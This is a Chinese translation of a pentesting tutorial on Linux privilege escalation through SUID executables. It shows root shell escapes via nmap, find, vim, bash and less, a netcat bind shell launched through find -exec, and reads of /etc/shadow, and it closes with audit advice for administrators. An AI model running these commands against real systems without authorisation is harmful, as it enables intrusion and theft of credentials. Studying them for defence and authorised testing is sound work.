> 原文链接: https://www.anquanke.com//post/id/86979 


# 【安全科普】Linux提权——利用可执行文件SUID


                                阅读量   
                                **562788**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：pentestlab.blog
                                <br>原文地址：[https://pentestlab.blog/2017/09/25/suid-executables/](https://pentestlab.blog/2017/09/25/suid-executables/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p2.ssl.qhimg.com/t0195cc5e80be0583d4.png)](https://p2.ssl.qhimg.com/t0195cc5e80be0583d4.png)

****

译者：[shan66](http://bobao.360.cn/member/contribute?uid=2522399780)

预估稿费：90RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿



**SUID**

**SUID**（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。那么，为什么要给Linux二进制文件设置这种权限呢？其实原因有很多，例如，程序ping需要**root权限**才能打开网络套接字，但执行该程序的用户通常都是由普通用户，来验证与其他主机的连通性。

但是，如果某些现有的二进制文件和实用程序具有SUID权限的话，就可以在执行时将权限提升为root。其中，大家熟知的具有提权功能的Linux可执行文件包括：



```
Nmap
Vim
find
Bash
More
Less
Nano
cp
```

以下命令可以找到正在系统上运行的所有SUID可执行文件。准确的说，这个命令将从/目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到/dev/null，从而仅列出该用户具有访问权限的那些二进制文件。



```
find / -user root -perm -4000 -print 2&gt;/dev/null
find / -perm -u=s -type f 2&gt;/dev/null
find / -user root -perm -4000 -exec ls -ldb `{``}` ;
```

[![](https://p1.ssl.qhimg.com/t01e0e384b8771a459b.png)](https://p1.ssl.qhimg.com/t01e0e384b8771a459b.png)

查找SUID可执行文件

以上所有二进制文件都将以root用户权限来执行，因为它们的权限中包含“s”，并且它们的属主为root。



```
ls -l /usr/bin/nmap
-rwsr-xr-x 1 root root 780676 2008-04-08 10:04 /usr/bin/nmap
```

[![](https://p3.ssl.qhimg.com/t01cbb7700c4a74c167.png)](https://p3.ssl.qhimg.com/t01cbb7700c4a74c167.png)

SUID可执行文件——Nmap

**<br>**

**Nmap**

较旧版本的Nmap（2.02至5.21）带有交互模式，从而允许用户执行shell命令。由于Nmap位于上面使用root权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的shell。

```
nmap -V
```

[![](https://p3.ssl.qhimg.com/t010e6cc4a62dfc5615.png)](https://p3.ssl.qhimg.com/t010e6cc4a62dfc5615.png)

识别Nmap的版本

为了启动交互模式，可以使用Nmap参数“interactive”。

[![](https://p5.ssl.qhimg.com/t0124e95cdae4dfac10.png)](https://p5.ssl.qhimg.com/t0124e95cdae4dfac10.png)

Nmap——交互模式

以下命令将提供一个提权后的shell。



```
nmap&gt; !sh
sh-3.2# whoami
root
```

[![](https://p1.ssl.qhimg.com/t0106b52251f77c18e5.png)](https://p1.ssl.qhimg.com/t0106b52251f77c18e5.png)

通过Suid Nmap二进制文件获得Root Shell

此外，还有一个Metasploit模块，也可以通过SUID Nmap二进制文件进行提权。



```
exploit/unix/local/setuid_nmap
```

**<br>**

**Find**

实用程序find用来在系统中查找文件。同时，它也有执行命令的能力。 因此，如果配置为使用SUID权限运行，则可以通过find执行的命令都将以root身份去运行。



```
touch pentestlab
find pentestlab -exec whoami ;
```

[![](https://p2.ssl.qhimg.com/t01e941a9fcd987eb16.png)](https://p2.ssl.qhimg.com/t01e941a9fcd987eb16.png)

Find执行命令的功能

由于大多数Linux操作系统都安装了netcat，因此可以将提权后的命令提升为root shell。

```
find pentestlab -exec netcat -lvp 5555 -e /bin/sh ;
```

[![](https://p3.ssl.qhimg.com/t01e1da281f98c55f0d.png)](https://p3.ssl.qhimg.com/t01e1da281f98c55f0d.png)

通过Find运行Netcat

连接到打开的端口就能得到一个root shell。



```
netcat 192.168.1.189 5555
id
cat /etc/shadow
```

[![](https://p3.ssl.qhimg.com/t017347f10dca99cc20.png)](https://p3.ssl.qhimg.com/t017347f10dca99cc20.png)

通过Find取得Root Shell

**<br>**

**Vim**

Vim的主要用途是用作文本编辑器。 但是，如果以SUID运行，它将继承root用户的权限，因此可以读取系统上的所有文件。

```
vim.tiny /etc/shadow
```

[![](https://p5.ssl.qhimg.com/t0168d08a653a986d57.png)](https://p5.ssl.qhimg.com/t0168d08a653a986d57.png)

Vim ——以root权限读取文件

此外，我们还可以通过Vim运行shell来执行只有root才能完成的操作。



```
vim.tiny
# Press ESC key
:set shell=/bin/sh
:shell
```

[![](https://p5.ssl.qhimg.com/t017bc2b9e078c1a810.png)](https://p5.ssl.qhimg.com/t017bc2b9e078c1a810.png)

Vim——Root Shell

**<br>**

**Bash**

以下命令将以root身份打开一个bash shell。



```
bash -p
bash-3.2# id
uid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)
```

[![](https://p1.ssl.qhimg.com/t01e7562e3240087d02.png)](https://p1.ssl.qhimg.com/t01e7562e3240087d02.png)

Bash——Root Shell

**<br>**

**Less**

程序Less也可以执行提权后的shell。同样的方法也适用于其他许多命令。  



```
less /etc/passwd
!/bin/sh
```

[![](https://p2.ssl.qhimg.com/t01a787c9a569c36319.png)](https://p2.ssl.qhimg.com/t01a787c9a569c36319.png)

Less——Root Shell

**<br>**

**结束语**

由于通过误设SUID的可执行文件可以轻而易举的实现提权，因此，管理员应仔细审查所有SUID二进制文件，看看到底是否真的需要使用提权后运行。在这个审查过程中，应该特别关注能够在系统上执行代码或写入数据的那些应用程序。
